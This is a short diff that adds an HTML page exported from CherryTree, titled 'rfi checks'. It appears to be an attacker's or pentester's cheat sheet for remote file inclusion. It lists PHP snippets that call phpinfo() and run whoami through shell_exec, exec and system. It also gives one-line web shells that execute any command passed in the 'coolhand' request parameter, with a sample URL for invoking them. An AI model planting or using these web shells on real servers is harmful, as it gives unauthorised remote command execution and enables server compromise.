@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>rfi checks</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>rfi checks</h1><br/>&lt;?php<br />echo “howdy”;<br />?&gt;<br /><br />&lt;?php<br />phpinfo();                                          see what functions are allowed and blocked<br />?&gt;<br /><br />&lt;?php<br />echo shell_exec(whoami);<br />?&gt;<br /><br />&lt;?php<br />echo exec(whoami);<br />?&gt;<br /><br />&lt;?php<br />echo system(whoami);<br />?&gt;<br /><br /><br />&lt;?php echo system($_REQUEST[&#39;coolhand&#39;]); ?&gt;                   navigate to <a href="http://hostname/dir/filename.php?coolhand=whoami">http://hostname/dir/filename.php?coolhand=whoami</a><br />&lt;?php echo shell_exec($_REQUEST[&#39;coolhand&#39;]); ?&gt;<br />&lt;?php echo exec($_REQUEST[&#39;coolhand&#39;]); ?&gt;<br /></div></body></html>
